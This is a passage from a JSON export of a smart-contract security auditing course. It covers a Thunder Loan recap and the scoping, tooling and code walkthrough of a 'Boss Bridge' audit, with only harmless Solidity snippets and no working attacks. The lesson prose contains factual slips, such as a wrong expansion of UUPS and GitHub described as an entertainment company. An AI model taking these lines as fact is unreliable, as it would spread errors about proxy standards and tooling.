lean towards a higher likelihood considering that an upgrade was planned.\n\nThe key here is to understand your protocol's likelihood and impact of the storage collision issues, which is a very common pain-point when it comes to proxy contract upgrades.\n\n## Identifying the Root Cause\n\nA root cause analysis reveals that variable location mix-ups can result in storage collisions. In our Thunder Loan case, the problem arises in the _Flash Loan fee_ and the process of _Flash Loaning_. The severity of this problem means that it could potentially paralyze the entire protocol due to the storage location mismatches.\n\n## Potential Mitigations and Recommendations\n\nTo mitigate such an issue, it is recommended to maintain constant variables when removing and introducing storage variables.\n\n![](https://cdn.videotap.com/MJYevuA6WF1Wcqj3AgIR-148.52.png)\n\nThis recommendation is based on the understanding that storage layouts are very important to the solidity coding structure â€“ modifying them could lead to unexpected errors.\n\n## Wrapping Up\n\nIn this post, we have walked through not just the intricacies of debugging and improving solidity code, but also the complexities that proxy contracts introduce. It's no surprise that some developers see proxies as a necessary evil while others view them as progress in the smart contract sphere.\n\nWhether you side with the 'Bad News Bears' or 'Great Progress' team, we strongly encourage you to share your view in our ongoing community discussion!\n\nAs for our next step with Thunder Loan, that will largely consist of doing the reporting. Stay tuned for more updates in that regard. Happy coding until then!\n",
          "updates": []
        },
        {
          "lessonId": "04952e33-4469-4ae7-8848-e964fc003ee4",
          "number": 49,
          "title": "Section 6 Recap",
          "slug": "section-6-recap",
          "folderName": "49-section-6-recap",
          "description": "",
          "duration": 6,
          "videoUrl": "X02Z901eEf1F4TaMTbnG3VY31sCSEwFmxwmL8rpslepto",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/49-section-6-recap/+page.md",
          "markdownContent": "---\ntitle: Section 6 - Recap\n---\n\n.\n\n## Unraveling the Flash Loans on Thunder Management Protocol\n\nFirstly, let's talk about flash loans, the key feature of the Thunder Management Protocol. Flash loans are innovative DeFi tools that allow users to borrow substantial amounts of assets for one single transaction. They have gained prominence due to their significant use in arbitrage opportunities, previously only utilized by prolific investors, fondly known as 'whales'. With flash loans, however, anyone can seize these golden opportunities.\n\n![](https://cdn.videotap.com/XdZhyn8C3rqPpi7yPlNe-50.31.png)\n\n> \"Flash loans are phenomenal DeFi primitives turning anyone into a whale.\"\n\nAs security researchers, we recognize the importance of understanding top protocols like Aave and Compound. This foundational knowledge provides us with necessary context for quicker and more efficient future project comparisons. Moreover, we've realized using an AMM(Automated Market Maker) or a DEX(Decentralized Exchange) protocol as a pricing oracle is a poor choice. Instead, a decentralized price feed like Chainlink should be on your go-to list for robust and secure oracle solutions.\n\n## Shedding Light on Proxies and their Risks\n\nWe discussed the significant implications of utilizing proxies in contract development, particularly UUPS(Upgradable Unambiguous Proxy Standard). Proxies can lead to dreaded risks such as centralization and storage collisions if not handled carefully. However, our discussion did not extensively cover the transparent proxy or the multi-faucet proxyâ€”important topics available for further research.\n\n![](https://cdn.videotap.com/rq3TwsRcnxoecVEB3Kir-138.35.png)\n\nOne intriguing topic we brushed upon is 'malicious scope'. Sometimes, while auditing a codebase, a protocol might ask you to ignore auditing a certain part. Interestingly, that often is the part housing the rug pull. As analysts, it's important to snuff out such malicious intentions. If you keep missing the red flags and all audited projects end in rug pulls, it reflects poorly on your auditing abilities. At the very least, all potential risks should be plainly stated in the audit report, serving as a potential alarm for the readers.\n\n## Introduction to Useful Tooling and Strategies\n\nExploring some handy tools, we touched briefly upon Upgrade Hub, a powerful tool highlighting how often protocols have undergone silent upgradesâ€”some rather misleading ones, though. In addition, we dug into some fascinating exploits, especially the infamous failure to initialize contracts. Important note: always ensure contracts you're analyzing or designing have a method deployed to authenticate contract initializations.\n\n![](https://cdn.videotap.com/WZFqXvkBGJ6wgC3VdPJ0-188.65.png)\n\nTalking about the infamous Oasis case study, it served as a prime example demonstrating the repercussions of protocol centralization, reminding us of the potential rug pull danger lurking beneath the surface of centralized architectures. Remember to signal such major centralization risk in your audit reports.\n\nAnother important topic was Oracle and price manipulations. A considerable number of Oracle manipulation attacks pose high risks, reinforcing our advice not to use an AMM as your pricing Oracle.\n\nWe concluded our section with design patterns, aiding in understanding the underlying operational concepts in smart contract development.\n\n## Concluding Remarks and How to Move Forward\n\nAdmittedly, this section is information-dense and might seem confusing at first glance. However, remember to interact with fellow developers, share insights, ask questions, and contribute to discussions on platforms such as our Cypher Updraft community. Youâ€™ll find yourself gradually familiarizing with the concepts, making them seem less daunting.\n\n![](https://cdn.videotap.com/aXjjMtL66bz5IgquDe55-264.12.png)\n\nOnwards, we're heading to section seven, offering riveting insights about Boss Bridge and its inner workings. It's going to be an intriguing journey into Yul and Assembly's realmâ€”an important break from our previous section.\n\nA massive thank you to everyone following along on this informative journey. Your perseverance and eagerness to learn have made this adventure fun and informative, equally. Remember, it's okay to take a breather, get some coffee, maybe go for a good workout, rest, and come back ready to dive deeper into this fascinating world of blockchain and smart contracts.\n\nOkay then, are we ready to dive into section seven? Great! Letâ€™s begin our exploration.\n\n![](https://cdn.videotap.com/i3PPe1YFwpZgqTiGNVBF-314.42.png)\ns\n",
          "updates": []
        }
      ]
    },
    {
      "number": 7,
      "sectionId": "3753a05a-5de5-4b4b-9766-5e1a75eb1d73",
      "title": "Boss Bridge",
      "slug": "bridges",
      "folderName": "7-bridges",
      "lessons": [
        {
          "lessonId": "0f5c515e-a28a-4a32-abcc-1e81b432b1b8",
          "number": 1,
          "title": "Introduction",
          "slug": "part-intro",
          "folderName": "1-part-intro",
          "description": "",
          "duration": 5,
          "videoUrl": "UOd1naVgBvDrM6bfbDEunjXlMo4rq7HqvZ0002Ree102Zs",
          "rawMarkdownUrl": "/routes/security/7-bridges/1-part-intro/+page.md",
          "markdownContent": "---\ntitle: Introduction\n---\n\n\n\n---\n\n# Unveiling Section Seven of Security and Auditing EVM DeFi: A Comprehensive Security Review\n\nWelcome back, enthusiastic coders! Brace yourselves for an exciting deep dive into Section Seven of the Security and Auditing EVM DeFi. In this intriguing space, we are going to roll up our sleeves and immerse in not less than five detailed security reviews or audits. Stay tuned for more in part two as well.\n\n## Flashback to Thunder Loan\n\nWe have recently waved goodbye to the thrilling Thunder loan security review and audit, an eye-opener in the world of Decentralized Finance (DeFi). The concept explored here, ranging from flash loans to Oracle manipulation encapsulates the primary attacks presently haunting DeFi.\n\n![](https://cdn.videotap.com/j6Dr40RzmumPq9jhPJY3-36.13.png)\n\n### New Concepts Unfolded\n\nOur journey shed light on a multitude of aspects essential for better understanding the DeFi landscape, including price Oracle manipulation, reward manipulation, insufficient function access control, and a gamut of logic errors, function parameter validation, misconfigurations and reentrancies.\n\nWhile these are considerable advancements, we are yet to uncover every crevice of the DeFi sphere. More obscure areas, such as governance attacks and stolen private keys, are yet to be traversed. Fortunately, we will unveil these mysteries and delve deeper into the riveting world of DeFi security in this seventh chapter.\n\n## Sneak Peek into Section Seven\n\nPrimarily, we will scrutinize the Seven Boss Bridge audit code base, currently available for the first flight on the [CodeHawks platform](https://www.codehawks.com).\n\n![](https://cdn.videotap.com/LLXHIyWzga7BHJru6Wjv-90.31.png)\n\n### The Power of CodeHawks\n\nRemember, reading and evaluating security reviews is an effective way to level-up your skills. If tech-upscaling piques your interest, Code Hawks curates a vast array of first flights that are worth exploring. Furthermore, signing up for CodeOx posts and participating in competitive audits can be quite advantageous.\n\n### Repo Overview and Tooling Upgrades\n\nExploring this chapter's repo, we will first notice two conventional branches: `main` and `audit data`, where `audit data` hosts the answer keys (no peeking!).\n\nWe will explore varying Ethereum Virtual Machine (EVM) chains such as Arbitrum, Optimism, ZKSync, and Ethereum. We will ponder whether these are analogous or have unique features that set them apart.\n\nFurthermore, we will explore tools, Tenderly and Solidit, which will aid us in streamlining our code review process.\n\n### The Hans Checklist: A Systematic Approach to Coding Reviews\n\nNext, we delve into a novel system for conducting smart contract security reviews: the Hans Checklist.\n\nTowards the end of this section, we'll break down Hans' trend-setting checklist methodology, which helped him ascend to the rank of top competitive auditor globally for the first half of 2023.\n\n## The Classic Security Review Steps and Exciting Case Studies\n\nAs before, we will follow the classical method for security reviews, incorporating scoping, reconnaissance, vulnerability identification, writeups, and reporting. We will also look at the intriguing case studies based on various chains, including Polygon, ZK Sync, and how different chains actually work with different opcodes.\n\nIn this part, we will focus more on bridge hacks as these were rampant in the year 2022. Most bridge hacks we noticed unfortunately happened due to centralized controls and the loss of private keys, leading to bizarre exploitations.\n\nWe will also study several exciting exercises that include researching some attacks and doing write-ups on them. Some significant aspects would be Signature Replay, merkel tree, signature issues, polygon double spend, and nomad bridge hack.\n\n## Onwards with the Contract Scoping Phase\n\nFinally, after discussing the technicalities, we will commence with the scoping phase of the contract that will be considerably quicker this time. Following the scoping, we will move on to the actual security review of the contract.\n\nRemember, there are conceivably more issues than we cover. Thus, if you stumble across some extra issues, don't hesitate to share your insights!\n\nBrace yourselvesâ€”with all that we have in store, we're sure to add significant value to your coding and auditing skills, inspiring you to dive deeper into the mesmerizing world of coding.\n",
          "updates": []
        },
        {
          "lessonId": "d52feb22-38e1-4616-b8e6-274c58a892b6",
          "number": 2,
          "title": "Phase 1: Scoping",
          "slug": "phase-1-scoping",
          "folderName": "2-phase-1-scoping",
          "description": "",
          "duration": 6,
          "videoUrl": "CrqWU5yUS69Y00Jzrrr6Rc1pc4t5uUX00sMtUNPcNUKas",
          "rawMarkdownUrl": "/routes/security/7-bridges/2-phase-1-scoping/+page.md",
          "markdownContent": "---\ntitle: Phase 1: Scoping\n---\n\n_Follow along with the video lesson:_\n\n\n\n---\n\n# Kick-starting our Security Audit: The Boss Bridge Project Case Study\n\nIn this extensive blog post, we're going to dive into the world of security auditing, using an example project: Boss Bridge. We'll begin in a familiar place, assuming you've just downloaded the project through GitHub, opened a fresh VS Code window, and you're ready to explore.\n\n## Getting Started: The Importance of Pre-boarding\n\nWhen auditing any projectâ€™s codebase, a key step in your preparation should be notetaking: scribbling down your thoughts, ideas and key points in your 'notes' section or equivalent. Think of it as your own personal checkpoint system.\n\nAs you delve further into the codebase, your entity list should grow into a robust compilation. This helps keep track of vulnerabilities, concepts to revisit, and potential threat vectors that could minimise attacks. Just like a detective unravelling the clues, your notes provide the foundation of a thorough investigation.\n\n## Understanding the project scope\n\nOnce you've downloaded the code, the next step is to determine the overall project scope. Begin by investigating the 'src' folder, opening the README file, and understand its core facets.\n\n![](https://cdn.videotap.com/Z6FwLQhDRCyW6ZPk1OQ4-80.11.png)\n\nTo determine the full extent of the project, you'll need to scrutinize the audit scope details particularly. Here, you'll uncover details of the commit hash, the contracts and tokens, any unusual behaviors, and even the expected deployment chains.\n\n### Holler Out for More Information\n\nDon't hesitate to reach out if you need additional data. Developing a comprehensive understanding of this project is pivotal, and while speed is critical, you want to ensure you aren't missing critical elements. Request more diagrams, data, and subsequent supporting information as needed.\n\n### An Overview of the Contracts\n\nFrom our initial study, we gather that our contracts will deploy to the Ethereum Mainnet. Interestingly, we're deploying a new entity, `tokenfactory.sol`, for the first time to ZKsync era.\n\n![](https://cdn.videotap.com/SYHd0AD9SPTDOeE3c8j6-148.78.png)\n\nYou will notice several roles or 'actors', one of which has the authority to pause and unpause the bridge in event of an emergency - a common design pattern known as the Emergency Stop pattern.\n\n## Acknowledging known issues\n\nFrom the outset, it's evident that there's an element of centralization with the project. This sort of authority vested with an individual or a single entity has its own pros and cons. On one hand, it's beneficial for effective and quick resolution of discrepancies. On the other, it tends to undermine the fundamental principle of blockchain's decentralization. However, such centrality aspects could be disregarded in a competitive audit.\n\nUpon further review, we notice that zero-address checking seems to be intentionally disabled, presumably to save gas. Also, there are some magic numbers that, instead of being recognized as constants, have been distinguished as literals.\n\nDespite these hiccups, it's clear that the protocol has a decent understanding of 'weird ERC20s'. They've incorporated `make slither` and `make aderyn` into the codebase as tools, key signs of protocol's awareness towards security.\n\n## Checking Code Coverage\n\nTo get an idea of the code coverage, we need to install the necessary libraries and run `forge coverage`. While our coverage might not be exhaustive, it could be considerably better. The `tokenfactory` is fully covered. However, the `vault` entity misses out entirely, which might result in several attack vectors.\n\n![](https://cdn.videotap.com/gS0LrDyx1XBys7mxdaUB-240.33.png)\n\nIn such scenarios, stateful fuzzing test suites could compensate for the shortcoming in manual reviews. At the moment, this approach is increasingly becoming a standard requirement for security.\n\n## Running Solidity Metrics\n\nFinally, as part of your project scope, remember to run a couple of tools â€“ even if it blurs into vulnerability identification. This instance of the project has a complexity score of 106 and 101 lines of code â€“ nearly half the size of the Thunder Loan project, which makes it quite simple to work through.\n\nWith this comprehensive understanding of the README and documentation, it's time to start your reconnaissance. From here on, with the context you've gained from the project scope, you're ready to probe further and uncover potential vulnerabilities and exploits.\n\nHappy auditing!\n",
          "updates": []
        },
        {
          "lessonId": "846a626f-c44a-4167-9988-cdaedce16969",
          "number": 3,
          "title": "Phase 2: Recon",
          "slug": "recon",
          "folderName": "3-recon",
          "description": "",
          "duration": 2,
          "videoUrl": "ivB900sX48JF7N02aUvOS01U7Lg1LnDddOWYfHTeVGDGlI",
          "rawMarkdownUrl": "/routes/security/7-bridges/3-recon/+page.md",
          "markdownContent": "---\ntitle: Recon\n---\n\n\n\n---\n\n# Static Analysis of Ethereum Smart Contracts\n\nOne of the first steps in smart contract auditing involves the use of static analysis tools. These tools can scan your codebase and identify potential issues such as vulnerabilities, bugs, or deviations from best practices. This blog post will provide a detailed walkthrough of static analysis, using `make slither` and `make aderyn` commands as primary examples of tools that we can use.\n\n## Reading The Documentation\n\nThe first step on this journey of static analysis will always be reading the documentation of the tool that you want to use. Why is this? Because it will help you understand the full capabilities of these tools. Despite this, the documentation step is often overlooked, so do remember to pay special attention to it.\n\nToday, however, after a quick glance over the user manual, I am eager to dive straight into the codebase. Brace yourself for some adventurous code auditing!\n\n## Running Static Analysis Tools\n\nIn this scenario, I've decided to start by running my static analysis tools.\n\n![](https://cdn.videotap.com/WV5JlvHe6ylxiE7aFko2-12.35.png)\n\nThe command to initiate the process is `make slither`. This should be run as a baseline test for any codebase under scrutiny. As devs, it's our responsibility to ensure a codebase complies with best practices.\n...\nIt turns out the codebase is riddled with issues. But no worries â€“ this is what we signed up for. Letâ€™s dive deeply into these issues shortly.\n\nNext, it's time to run the `make aderyn` command to get a secondary report:\n\n## Analyzing the Report\n\nNow we have the `report.md` ready. Time to examine its findings.\n\n![](https://cdn.videotap.com/l0Mt9wevI06wPhE5FmZS-38.8.png)\n\nA sneak peek into the report reveals some medium-grade issues. Let's examine them closely:\n\n- **Centralized Risk** - The contract has a centralized risk problem. Despite the fact that blockchain was built on the pillars of decentralization, many developers fall into the trap of creating contracts that rely on central authority.\n- **Unsafe ERC20 operations** - The contract uses unsafe ERC20 operations. This is a big no-no.\n\n> \"ERC20 operations should not be used. The return values are not always meaningful. It is recommended to use [OpenZeppelin's SafeERC20 library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol)\".\n\n- **Missing zero address checks** - The contract does not have zero address checks.\n- **Functions could be marked external** - There are functions which are not used internally, these could be marked external which could save some gas.\n- **Undefined constants** - The contract uses magic numbers instead of defined constants.\n- **Incorrect events** - Events in the contract are not defined correctly.\n\nThe report from Aderyn is full of useful insights. They will all be copied and pasted into their rightful sections in the final report.\n\n## Reconnaissance\n\nFinally, it's time for reconnaissance. I pondered over whether to do the `Tincho`, which analyzes the contracts from the least to the most complex. Since there are only four contracts, I opted to forgo creating a new sheet for documentation.\n\nStay tuned for further posts to unveil the specifics of each of these issues, and the steps taken to mitigate them.\n",
          "updates": []
        },
        {
          "lessonId": "79941ec5-6897-46fd-a326-69e439282e2c",
          "number": 4,
          "title": "Checklist",
          "slug": "checklist",
          "folderName": "4-checklist",
          "description": "",
          "duration": 4,
          "videoUrl": "x5BUf3muNj01dX5CBkhrVcXFhl0236gYCgzGfX2uNr7xA",
          "rawMarkdownUrl": "/routes/security/7-bridges/4-checklist/+page.md",
          "markdownContent": "---\ntitle: Checklist\n---\n\n\n\n---\n\n# The Ultimate Auditorâ€™s Checklist Method: The Hans\n\nHave you ever wondered about the techniques that a talented and successful auditor uses (like the No.1 Web3 auditor, Hans), to keep everything organized? Well, wonder no more. Today, we are going to discuss an important tool Hans uses, a highly comprehensive checklist that we will explore here. The information might astonish you, so now is the time to buckle up for an Audit Adventure.\n\n![](https://cdn.videotap.com/tXeWNgj1dZEkapH1ksfB-13.48.png)\n\n## The Power of a Checklist\n\nThe power of a checklist lies in the precision it can bring to a potentially massive process. By breaking down what might otherwise feel like a daunting task into structured and doable segments, checklists allow us to tread with confidence. Entertainment tech giant GitHub has embraced this approach by maintaining a repository-driven checklist entitled \"audit checklist\" for performing code audits.\n\n> The checklist is part of an extensive repertoire of different attacks complete with links to Solidit, where these attacks have been reported, their implications and much more. Initially, it is in the JSON format, but will soon be hosted on Solidit for an enhanced user-friendly experience.\n\nYou can view and utilize this effective tool [here](https://github.com/Cyfrin/audit-checklist).\n\n![](https://cdn.videotap.com/Os7tDGbFK1OTvjjccMdx-60.68.png)\n\n## Diving into the Checklist\n\nThe checklist dives instinctively into an attacker's mindset and focuses on a list of general checks for common attack types. Each section is meticulously designed to guide you through the audit process, complete with descriptions, remedial advice, references to potential attacks, and tags.\n\nFor instance, a section on \"Reentrancy Attacks\" includes questions you might ask to verify a system is safe from this category of assault. Questions like: \"Are there any state changes after interaction with an external contract?\" guide the process strategically.\n\nThe checklist covers other types of attacks, such as:\n\n- Denial-of-Service\n- Griefing Attacks\n- Replay Attacks\n\nThe FAQ format ensures youâ€™re doing your due diligence when evaluating a protocol. For example, under denial of service, you could inquire \"Is the withdrawal pattern followed to prevent denial of service?\" or scrutinize how the protocol manages tokens with blacklisting functionality â€“ a point we have touched on before.\n\n## Making It Your Own\n\nOptimizing this checklist to suit your needs will help you make the most of it. You can do this by visiting the [Cyfrin GitHub audit checklist](https://github.com/Cyfrin/audit-checklist) and tweaking the JSON format to suit your preferences. The inclusion of your ideas not only makes the checklist more usable but also contributes to the creation of a collective knowledge base that benefits everyone.\n\n![](https://cdn.videotap.com/ndm5LlDWEj2Gnsr6ADqz-148.32.png)\n\n## Going Beyond the Given\n\nThe nature of our industry means the checklist isnâ€™t definitive. New issues and challenges come up that might not be covered by the current framework.\n\nTherefore, this checklist remains a living document, one which requires continuous updating and refining. This could mean adding new issues to your list or making a pull request to include new questions that arise during the audit process.\n\n## Conclusion\n\nSo there it is, the Auditor's Checklist Method by Hans. The roadmap to auditing a project, checking off every potential security vulnerability, ensuring that the protocol follows best practices.\n\nRemember, the best use of this checklist comes not only from following it but also in reflecting upon its points and amalgamating your insights into it.\n\nHappy auditing!\n\n![](https://cdn.videotap.com/B8DVGbPuHxUALaBDmvYC-202.26.png)\n",
          "updates": []
        },
        {
          "lessonId": "925e54df-38a4-466f-8c04-b7cabf3f39ce",
          "number": 5,
          "title": "Docs",
          "slug": "Docs",
          "folderName": "5-Docs",
          "description": "",
          "duration": 2,
          "videoUrl": "mq7UPZlyX1LE9euvtNg5ngqlXrbeIDpTrenEiqU0097I",
          "rawMarkdownUrl": "/routes/security/7-bridges/5-Docs/+page.md",
          "markdownContent": "---\ntitle: Docs\n---\n\n## \n\n# Bridging the Gap: Introducing Boss Bridge for ERC20 Tokens\n\n![](https://cdn.videotap.com/7JrqjCcxUyOafjUdWM9V-11.74.png)\n\n## How Does Boss Bridge Work?\n\nIn essence, the key function of our Boss Bridge is providing a pathway for users to deposit their tokens. Upon deposit, these tokens are stored securely in an L1 digital vault. The deposit event triggers a subsequent off-chain event which our mechanism discerningly picks up, parses it, and then mints the corresponding amount in L2.\n\n> Remember: The main goal here is ensuring user safety and security.\n\nThe first version of the bridge adheres strictly to this ideal and includes several security features.\n\n## Key Security Features\n\nThe current version of our Boss Bridge boasts multiple mechanisms aimed at enhancing the security of deposited tokens:\n\n1. The bridge owner has full authority to pause any operations during emergent situations.\n2. Account deposits are permissionless, but to avoid any potential abuse, we have imposed a strict limit on the number of tokens that can be deposited.\n3. All withdrawal requests must be approved by the bridge owner.\n\nWe are focused on continually improving this system, making it even safer and more secure with each update.\n\n![](https://cdn.videotap.com/DSoIzu6Rtt37d8MackPQ-55.77.png)\n\n## The Launch\n\nWe are preparing to launch our L1 Boss Bridge on both the Ethereum Mainnet and ZK Sync platforms. Initially, we will use only L1 tokens, or their duplicates, within the bridge system.\n\n**Please note**: At this early stage, other ERC20 tokens will not be supported, and their 'weirdness' is considered out of scope on withdrawals.\n\n## Withdrawal Process\n\nIn the context of withdrawals, the bridge operator holds the responsibility of signing each withdrawal request submitted by users. These requests are made on the L2 component of the bridge.\n\nEssential point to mention: For a successful withdrawal, our service will check that the account submitting a withdrawal previously initiated a successful deposit on the L1 part of the bridge.\n\n![](https://cdn.videotap.com/oRDUILrsz7wMudIoZwVx-76.32.png)\n\n## Making Sense of the Boss Bridge\n\nIf this seems a bit overwhelming, it is natural. This is where you might be getting the urge to delve into the protocol design, or you might want to explore the contract and draw up some diagrams on your own.\n\nIn either case, these are healthy steps toward understanding the mechanism better. For those willing to roll up their sleeves and create some diagrams, we encourage you to pause right here, grab your notebook, and start sketching. It's a great learning experience!\n",
          "updates": []
        },
        {
          "lessonId": "5328d856-613d-444a-9ecd-2a5955ae342e",
          "number": 6,
          "title": "Boss Bridge Diagram",
          "slug": "boss-bridge-diagram",
          "folderName": "6-boss-bridge-diagram",
          "description": "",
          "duration": 6,
          "videoUrl": "ofSZi6DuGeL01HATXfvtjSBttM5Rejb9ABM38GJhi01hA",
          "rawMarkdownUrl": "/routes/security/7-bridges/6-boss-bridge-diagram/+page.md",
          "markdownContent": "---\ntitle: Boss Bridge Diagram\n---\n\n\n\n---\n\n# Understanding Bridges in Ethereum and ZK Sync with Audit Data\n\nHello, everyone! If you've been scrolling through the audit data section of our Git repo, you might have noticed a sketch of the L1-L2 Bridge structure used for transactions, meant to illustrate contract creation and token execution. Let's go through it together!\n\n## The Bridge Structure\n\n![](https://cdn.videotap.com/rIxjCdQQCX2uJutT8w6U-12.43.png)\n\nAs you can see from the image, on the left of this dotted line, we have contracts on the Layer One (L1), while on the right side you can see the contracts yet to be built -- for now, they are only imaginary. They will exist in the future on Layer Two (L2).\n\nThe L1 is where we focus most of our attention. Why? Because this is where we have the Tokenfactory.sol - a pivotal contract whose sole function is to deploy L1 tokens.\n\n### The Role of the Tokenfactory\n\nThe `tokenfactory.sol` is a simple and minimal contract. It's ownable, comes with mappings, and you'll notice it has just one function - `deployToken`. This function deploys a new ERC20 token contract, accepting the contract bytecode as input.\n\n```js\nfunction deployToken(bytes memory bytecode) public onlyOwner returns (address){\n    return _deploy(bytecode);\n    }\n```\n\nThough it is noteworthy that deploying any contract can be hazardous, we'll assume that the `tokenfactory.sol` will correctly hold a copy of the L1 token contract bytecode and not any malicious ERC20.\n\n> - _\"We should note that you can potentially deploy anything with `deployToken()`, which isn't ideal.\"_\n\nYes, as unsettling as it might sound, this token factory could technically deploy any contract. But bear in mind, this is an accepted caveat that was already addressed in the known issues section of the documentation. We will not dwell much on this, as it is within the scope of the project, and any other issue arising would fall out of scope.\n\n### L1 Token - The Bridge\n\nMoving on, we have the `L1Token.sol`. This is a very minimal L1 token with a max supply named Boss Bridge Token (BBT). Its sole purpose is to journey between the L1 and the L2. For instance, your L1 could be something like ETH, and the L2 might be ZKSync, or vice-versa.\n\n![](https://cdn.videotap.com/j1ojbfHNdYgSRmp6YI6u-111.91.png)\n\nIt is important to note that L1 entities will be present on both Ethereum and ZKSync irrespective of the labeling.\n\nThen we have the main contract known as `L1BossBridge.sol`, responsible for facilitating the core operations of the system.\n\n### L1BossBridge - The Main Contract\n\nThe `L1BossBridge.sol` contract has a substantial role and a few capabilities. It can pause and unpause, illustrating some centralized power. Most crucially, it permits users to deposit tokens to L2 and withdraw tokens from the L2 back to the L1.\n\n```js\nfunction sendToL2(address _l2Delegate, address _token, uint256 _amount, uint256 _l2Gas, bytes calldata _data) external whenNotPaused returns (bytes memory){\n    /* (...rest of code...)*/\n}\n```\n\nThe `sendToL2()` function deposits token to L2. Once tokens are sent, they are locked into `L1Vault.sol`. This vault is relatively simple and doesn't really do much other than holding onto the L1 tokens approved by the Boss Bridge.\n\n### How Tokens Travel Between Layers\n\nWhen the Boss Bridge signals, the vault releases the tokens. This mechanism allows tokens to be sent from an L1 to an L2. In practice, if we send 10 tokens into the vault from the L1, these 10 tokens locked into the L1 vault aren't directly transferred to the L2.\n\nInstead, they are locked in another vault on the L2 side, triggering the system to release an equivalent number of tokens (in this case, 10) on the L2. This process of locking and releasing is observed and controlled by a centralized off-chain service.\n\nTo keep this a touch simpler and less technical, bridges usually work this way. You don't transmit tokens directly over the L1. Instead, you lock them into a vault, and the L2 produces an identical version of the token for you to use.\n\nThe final piece of this process involves tokens on L2 being relocked into the L2 vault. These Signers, the centralized units noteworthy for their crucial role, will approve the tokens to be unlocked on L1 again.\n\n```js\nfunction unlockL1(address _l2Delegate, address _token, uint256 _amount, bytes calldata _data) external whenNotPaused returns (bytes memory){\n    /* (...rest of code...)*/\n    }\n```\n\n### The Key Role of Signers\n\nSo these Signers are important because they see who's depositing to either layer and decide when to unlock or relock tokens. As valuable as this function is, it is also an embedded known issue with the protocol due to its centralized nature.\n\nOnce a token in L1 gets locked in the vault, it's liberated to roam in L2. Reversibly, when you lock it back into the L2 vault, Signers get a signal, and the tokens from L1 vault are released.\n\nI hope this makes sense. I hope this helps you understand how the bridge between layers work. If you have any further questions, feel free to drop a comment, and I'll be happy to help!\n",
          "updates": []
        },
        {
          "lessonId": "46830858-6899-4cd0-92df-d010c0f5e01c",
          "number": 7,
          "title": "L1 Token",
          "slug": "l1-token",
          "folderName": "7-l1-token",
          "description": "",
          "duration": 2,
          "videoUrl": "00WrYIi3u4Z9LIA2sDFwZwl89mDkOh01B2Hy27VGy1gVQ",
          "rawMarkdownUrl": "/routes/security/7-bridges/7-l1-token/+page.md",
          "markdownContent": "---\ntitle: L1Token.sol\n---\n\n\n\n---\n\n# Diving Deep into the Trenches with Solidity Code\n\nToday, we are armed with an abundance of context, which provides us with a fortified understanding of what this code base embodies. Let's begin!\n\n## Invoking the \"Tincho\"\n\n![](https://cdn.videotap.com/KbfZIIwRu0i6v3I4hHUH-9.1.png)\n\nWe're going to invoke the Tincho method in our exploration - starting with the little ones and progressively getting bigger, like a well-ascended staircase of understanding. And don't worry, we'll make sure to go through a checklist at the end to ensure we've covered all bases.\n\n## Descending to the Code Depths\n\nOur first stop? The smallest code base in our array of documents. Hop onboard, as we open up the file for `Solidity metrics` and navigate towards the seemingly insignificant number seven, `L1Token.sol`. A little intimidating, isnâ€™t it? But fear not, weâ€™re just about to dive deep and decipher this \"Bad Larry\".\n\n## Finding the Unexpected in the Expected\n\nUpon inspecting `L1Token.sol`, we find quite a regular landscape - not particularly striking with nothing out of the ordinary. But let's not rush our judgment.\n\nWe're leveraging codes from `OpenZeppelin`. As veterans in this field, weâ€™re well acquainted with `OpenZeppelin`.\n\n```js\nprivate constant initial_supply;\n```\n\nPrima facie, we encounter a private constant initial supply which seems appropriately allocated. It's multiplied by the decimal representation of ten - a magic number by a certain perspective but just a ten, hence, no alarm bells ringing.\n\n## Unravelling the Tests\n\nDiving deeper, we look for a deploy. Unfortunately, this section seems to be lacking a dedicated deployment component in its structure. There's a `token factory test`, but the sight of `L1Token` tests is scarce.\n\nBut wait, there's a silver lining! There are indeed a few tests conducted on the `L1Token`. For instance, we have a token transfer test.\n\nThis token is utilised in the transfer process, and it seems to deploy a brand-new token. Once again, nothing screams out of place - everything seems quite standard here.\n\n## Final Words\n\nAfter scrutinizing `L1Token.sol`, it appears quite compliant with standard solidity coding practices. Following the Tincho approach has led us to meticulously dissect this small piece of code, to such an extent, that we can confidently say - \"this looks fine\".\n\nContinuing on this journey, we will employ the same procedure to the next segment of the code. Embark on this journey with us as we delve into the eccentric and challenging world of software development, one line of code at a time.\n\n> \"The job of the coder is not just to code. It is to understand and then code.\" - Anonymous Developer\n",
          "updates": []
        },
        {
          "lessonId": "5ac83da6-7426-4962-99c5-4bf246942eff",
          "number": 8,
          "title": "Vault.sol",
          "slug": "vault-sol",
          "folderName": "8-vault",
          "description": "",
          "duration": 4,
          "videoUrl": "J02cZ02Livh01JhXcYvw00hREKQILG00Qot4NRmW3Rj8m7To",
          "rawMarkdownUrl": "/routes/security/7-bridges/8-vault/+page.md",
          "markdownContent": "---\ntitle: Vault.sol\n---\n\n\n\n---\n\n# Dive into the L1 Vault of TokenBridge\n\nIn this post, we're going to explore the innards of the Layer 1 (L1) vault, a critical part of the TokenBridge, a network built for token transfers between different blockchain networks.\n\n## The Role of the L1 Vault\n\nTo kick things off, the L1 Vault is essentially a storage box for tokens. It holds tokens when they're not being used or transferred on either L1 or Layer 2 (L2) networks. When needed, these tokens can be unlocked to \"frolic and play\" on the L1 or L2 playgrounds.\n\n![](https://cdn.videotap.com/SPq2DMS4BIdTLOfpIdi6-22.67.png)\n\nLet's dive deeper into the vault itself.\n\n## An Introduction to L1 Vault Structure\n\nThe L1 Vault, as expected, is slightly larger in size but not too big to handle. The vault is 'ownable', meaning it can have designated owners - this could be an individual, a group, or another contract.\n\nThere's a descriptor (NatSpec) on top that indicates the author's identity - Boss Bridge. According to the NatSpec, the contract has two primary responsibilities: locking and unlocking tokens on the L1 or L2, and giving the green light to a bridge so it can move funds to and from this contract.\n\nThe owner of this contract, the note says, should ideally be a bridge.\n\nAnd this sparks off our first question: can we somehow tweak it so that the owner is not the bridge?\n\n## Deployment of the L1 Vault\n\nHowever, the folks at TokenBridge seem to be missing a deploy folder, which is definitely something worth mentioning. How would you deploy your contract without a deploys directory? This could certainly improve.\n\nWe then dig further into how they launch the vault. They've got an initiation sequence where the vault is equated to 'tokenbridge.vaultâ€™, which seems to suggest that the Boss bridge itself is deploying the vault.\n\nTaking a closer look at the L1 Boss Bridge, this assumption is confirmed - the 'vault' is a public, immutable value. It is set to be the 'vault' address during the deployment process, which means there is likely no 